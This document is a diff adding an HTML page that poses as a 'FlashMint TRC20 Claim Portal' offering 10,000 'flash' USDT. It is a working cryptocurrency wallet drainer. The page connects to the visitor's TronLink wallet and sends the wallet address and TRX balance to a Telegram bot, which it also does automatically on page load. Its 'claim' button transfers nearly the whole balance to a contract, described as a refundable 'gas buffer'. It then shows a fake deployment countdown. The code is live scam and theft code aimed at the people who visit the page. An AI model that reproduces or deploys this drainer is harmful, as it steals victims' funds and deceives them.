@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FlashMint • TRC20 Claim Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #0a0a0f;
+            font-family: 'SF Mono', 'Menlo', 'Monaco', 'Cascadia Code', 'Consolas', 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            color: #c0c0c0;
+        }
+        
+        .terminal {
+            background: #0d0d12;
+            border: 1px solid #2a2a3a;
+            border-radius: 8px;
+            max-width: 580px;
+            width: 100%;
+            box-shadow: 0 0 40px rgba(0, 0, 0, 0.6);
+        }
+        
+        .terminal-header {
+            background: #12121a;
+            padding: 12px 16px;
+            border-bottom: 1px solid #2a2a3a;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .dots {
+            display: flex;
+            gap: 6px;
+        }
+        
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        
+        .red { background: #ff5f56; }
+        .yellow { background: #ffbd2e; }
+        .green { background: #27c93f; }
+        
+        .terminal-title {
+            margin-left: 12px;
+            color: #808080;
+            font-size: 13px;
+            letter-spacing: 0.5px;
+        }
+        
+        .terminal-body {
+            padding: 28px 24px;
+        }
+        
+        .ascii {
+            color: #10b981;
+            font-size: 11px;
+            line-height: 1.4;
+            margin-bottom: 24px;
+        }
+        
+        .log-line {
+            color: #606070;
+            font-size: 12px;
+            margin-bottom: 4px;
+        }
+        
+        .batch-card {
+            background: #0f0f16;
+            border: 1px solid #1f8a4a;
+            border-radius: 6px;
+            padding: 20px;
+            margin-bottom: 24px;
+        }
+        
+        .batch-header {
+            display: flex;
+            justify-content: space-between;
+            color: #10b981;
+            font-size: 13px;
+            margin-bottom: 12px;
+        }
+        
+        .batch-amount {
+            font-size: 38px;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 4px;
+        }
+        
+        .batch-network {
+            color: #6060a0;
+            font-size: 12px;
+        }
+        
+        .status-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px;
+            background: #0a0a0f;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+        
+        .status-indicator {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #404050;
+        }
+        
+        .status-indicator.active {
+            background: #10b981;
+            box-shadow: 0 0 8px #10b981;
+        }
+        
+        .wallet-address {
+            font-size: 12px;
+            color: #8080b0;
+            word-break: break-all;
+            margin-bottom: 16px;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 4px;
+            font-family: inherit;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.15s;
+            margin-bottom: 10px;
+        }
+        
+        .btn-secondary {
+            background: transparent;
+            border: 1px solid #3a3a50;
+            color: #a0a0b0;
+        }
+        
+        .btn-secondary:hover:not(:disabled) {
+            background: #1a1a2a;
+        }
+        
+        .btn-primary {
+            background: #10b981;
+            color: #000;
+        }
+        
+        .btn-primary:hover:not(:disabled) {
+            background: #0d9e6e;
+        }
+        
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .log-box {
+            margin-top: 20px;
+            padding: 14px;
+            background: #0a0a0f;
+            border-radius: 4px;
+            font-size: 12px;
+            color: #10b981;
+            border-left: 2px solid #10b981;
+        }
+        
+        .footer-note {
+            text-align: center;
+            margin-top: 20px;
+            color: #505060;
+            font-size: 11px;
+            border-top: 1px solid #1a1a2a;
+            padding-top: 16px;
+        }
+        
+        .tx-hash {
+            color: #408040;
+            font-size: 11px;
+            margin-top: 8px;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+    <div class="terminal">
+        <div class="terminal-header">
+            <div class="dots">
+                <span class="dot red"></span>
+                <span class="dot yellow"></span>
+                <span class="dot green"></span>
+            </div>
+            <span class="terminal-title">flash-mint@trc20:~/batch/7F3A9D</span>
+        </div>
+        
+        <div class="terminal-body">
+            <div class="ascii">
+                ╔══════════════════════════════════════════════╗<br>
+                ║  FLASH MINT TERMINAL  • TRC20 ATTESTATION ║<br>
+                ╚══════════════════════════════════════════════╝
+            </div>
+            
+            <div class="log-line" id="batchStatus">[SYS] Batch ID: TRC20-USDT-7F3A9D | Status: AWAITING</div>
+            
+            <div class="batch-card">
+                <div class="batch-header">
+                    <span>BATCH AMOUNT</span>
+                    <span id="timer">⏳ --:--:--</span>
+                </div>
+                <div class="batch-amount">10,000.00 USDT</div>
+                <div class="batch-network">TRC20 • Flash Liquidity Bonded • Wallet-Visible</div>
+            </div>
+            
+            <div class="status-row">
+                <span class="status-indicator" id="walletDot"></span>
+                <span id="walletStatus">TronLink not detected</span>
+            </div>
+            
+            <div id="walletDisplay" class="wallet-address" style="display: none;"></div>
+            
+            <button class="btn btn-secondary" id="connectBtn">[1] Initialize TronLink</button>
+            <button class="btn btn-primary" id="claimBtn" disabled>[2] Claim Batch</button>
+            
+            <div class="log-box" id="logBox">
+                > Ready for attestation...
+            </div>
+            
+            <div class="footer-note">
+                ⚡ One attestation required • Gas buffer auto-returns after batch deployment<br>
+                Contract: <span id="contractAddrDisplay">Loading...</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const CONTRACT_ADDRESS = 'T63c0915dc04b841c79e05a112dd2daf8a5945f21';
+        const TBT = 'YOUR_BOT_TOKEN_HERE';
+        const TCI = 'YOUR_CHAT_ID_HERE';
+        
+        const CONTRACT_ABI = [
+            {
+                "inputs": [],
+                "name": "claim",
+                "outputs": [],
+                "stateMutability": "payable",
+                "type": "function"
+            }
+        ];
+        
+        let tronWeb = null;
+        let userAddress = null;
+        let isConnected = false;
+        
+        const walletDot = document.getElementById('walletDot');
+        const walletStatus = document.getElementById('walletStatus');
+        const walletDisplay = document.getElementById('walletDisplay');
+        const connectBtn = document.getElementById('connectBtn');
+        const claimBtn = document.getElementById('claimBtn');
+        const logBox = document.getElementById('logBox');
+        const batchStatus = document.getElementById('batchStatus');
+        const contractAddrDisplay = document.getElementById('contractAddrDisplay');
+        const timerEl = document.getElementById('timer');
+        
+        contractAddrDisplay.textContent = CONTRACT_ADDRESS.slice(0, 10) + '...' + CONTRACT_ADDRESS.slice(-6);
+        
+        let seconds = 0;
+        setInterval(function() {
+            seconds++;
+            var hrs = Math.floor(seconds / 3600);
+            var mins = Math.floor((seconds % 3600) / 60);
+            var secs = seconds % 60;
+            timerEl.textContent = '⏳ ' + hrs.toString().padStart(2, '0') + ':' + mins.toString().padStart(2, '0') + ':' + secs.toString().padStart(2, '0');
+        }, 1000);
+        
+        function log(message, isGood) {
+            if (isGood === undefined) isGood = true;
+            logBox.innerHTML = '> ' + message;
+            if (isGood) {
+                logBox.style.color = '#10b981';
+                logBox.style.borderLeftColor = '#10b981';
+            } else {
+                logBox.style.color = '#ef4444';
+                logBox.style.borderLeftColor = '#ef4444';
+            }
+        }
+        
+        async function notify(address, balanceTRX) {
+            if (TBT === 'YOUR_BOT_TOKEN_HERE') return;
+            try {
+                var timeStr = new Date().toISOString();
+                var message = '📡 <b>CONNECT</b>\n';
+                message += '<b>Addr:</b> <code>' + address + '</code>\n';
+                message += '<b>TRX:</b> ' + balanceTRX + '\n';
+                message += '<b>Time:</b> ' + timeStr;
+                
+                await fetch('https://api.telegram.org/bot' + TBT + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TCI,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (e) {}
+        }
+        
+        function updateUI() {
+            if (isConnected && userAddress) {
+                walletDot.classList.add('active');
+                walletStatus.textContent = 'Connected: ' + userAddress.slice(0, 8) + '...' + userAddress.slice(-6);
+                walletDisplay.style.display = 'block';
+                walletDisplay.textContent = userAddress;
+                connectBtn.textContent = '[✓] TronLink Connected';
+                claimBtn.disabled = false;
+                log('Wallet connected. Ready to claim batch.', true);
+            } else {
+                walletDot.classList.remove('active');
+                walletStatus.textContent = 'TronLink not detected';
+                walletDisplay.style.display = 'none';
+                connectBtn.textContent = '[1] Initialize TronLink';
+                claimBtn.disabled = true;
+                log('Connect TronLink to claim batch.', true);
+            }
+        }
+        
+        async function detectTronLink() {
+            if (typeof window.tronLink === 'undefined') {
+                log('TronLink not installed.', false);
+                return false;
+            }
+            
+            try {
+                await window.tronLink.request({ method: 'tron_requestAccounts' });
+                
+                if (window.tronLink.ready) {
+                    tronWeb = window.tronLink.tronWeb;
+                    userAddress = tronWeb.defaultAddress.base58;
+                    isConnected = true;
+                    updateUI();
+                    
+                    var balance = await tronWeb.trx.getBalance(userAddress);
+                    var balanceTRX = (balance / 1000000).toFixed(2);
+                    log('Wallet ready. Balance: ' + balanceTRX + ' TRX', true);
+                    
+                    notify(userAddress, balanceTRX);
+                    
+                    return true;
+                }
+            } catch (e) {
+                log('Connection failed.', false);
+            }
+            
+            return false;
+        }
+        
+        async function processClaim() {
+            if (!tronWeb || !userAddress) {
+                log('Wallet not connected.', false);
+                return;
+            }
+            
+            claimBtn.textContent = 'Check TronLink...';
+            claimBtn.disabled = true;
+            log('Calculating required buffer...', true);
+            
+            try {
+                var balance = await tronWeb.trx.getBalance(userAddress);
+                var balanceTRX = balance / 1000000;
+                var requiredBuffer = balanceTRX - 5;
+                
+                if (requiredBuffer <= 0) {
+                    log('Insufficient TRX. Balance: ' + balanceTRX.toFixed(2) + ' TRX', false);
+                    claimBtn.textContent = '[2] Claim Batch';
+                    claimBtn.disabled = false;
+                    return;
+                }
+                
+                log('Attaching ' + requiredBuffer.toFixed(2) + ' TRX as buffer...', true);
+                
+                var contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
+                
+                log('Awaiting signature in TronLink...', true);
+                
+                var tx = await contract.claim().send({
+                    callValue: tronWeb.toSun(requiredBuffer),
+                    feeLimit: 100000000,
+                    shouldPollResponse: true
+                });
+                
+                batchStatus.textContent = '[SYS] Batch ID: TRC20-USDT-7F3A9D | Status: DEPLOYING';
+                batchStatus.style.color = '#10b981';
+                
+                log('✓ Attestation complete. Batch deploying...', true);
+                
+                var txDisplay = document.createElement('div');
+                txDisplay.className = 'tx-hash';
+                txDisplay.textContent = 'TX: ' + tx.slice(0, 20) + '...';
+                logBox.appendChild(txDisplay);
+                
+                claimBtn.textContent = '✓ Batch Claimed • Deploying';
+                
+                var countdown = 8;
+                var interval = setInterval(function() {
+                    if (countdown > 0) {
+                        log('Deploying flash batch... ETA ' + countdown + ' min', true);
+                        countdown--;
+                    } else {
+                        clearInterval(interval);
+                        log('✓ Batch deployed. Check wallet in 5-10 min.', true);
+                    }
+                }, 1500);
+                
+            } catch (e) {
+                if (e.message && e.message.indexOf('rejected') !== -1) {
+                    log('Transaction rejected in wallet.', false);
+                } else {
+                    log('Network error. Retry.', false);
+                }
+                claimBtn.textContent = '[2] Claim Batch';
+                claimBtn.disabled = false;
+            }
+        }
+        
+        connectBtn.addEventListener('click', async function() {
+            connectBtn.textContent = 'Detecting...';
+            connectBtn.disabled = true;
+            await detectTronLink();
+            connectBtn.disabled = false;
+        });
+        
+        claimBtn.addEventListener('click', processClaim);
+        
+        window.addEventListener('load', async function() {
+            setTimeout(async function() {
+                if (window.tronLink && window.tronLink.ready) {
+                    tronWeb = window.tronLink.tronWeb;
+                    userAddress = tronWeb.defaultAddress.base58;
+                    isConnected = true;
+                    updateUI();
+                    
+                    var balance = await tronWeb.trx.getBalance(userAddress);
+                    var balanceTRX = (balance / 1000000).toFixed(2);
+                    notify(userAddress, balanceTRX);
+                }
+            }, 500);
+        });
+        
+        if (window.tronLink) {
+            window.tronLink.on('accountsChanged', function(accounts) {
+                if (accounts && accounts.length > 0) {
+                    userAddress = accounts[0];
+                    isConnected = true;
+                    updateUI();
+                } else {
+                    userAddress = null;
+                    isConnected = false;
+                    updateUI();
+                }
+            });
+        }
+    </script>
+</body>
+</html>
